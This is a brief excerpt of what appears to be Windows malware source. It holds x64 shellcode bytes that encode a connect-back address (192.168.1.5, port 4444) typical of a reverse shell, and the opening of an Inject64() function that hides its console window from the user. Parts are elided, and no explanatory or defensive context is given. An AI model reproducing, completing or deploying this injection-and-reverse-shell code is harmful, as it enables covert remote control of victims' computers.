...
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x05\x41\x54"
...
int Inject64()
{
	...
	HWND HideNotepad;
	AllocConsole();
	HideNotepad = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(HideNotepad, 0);
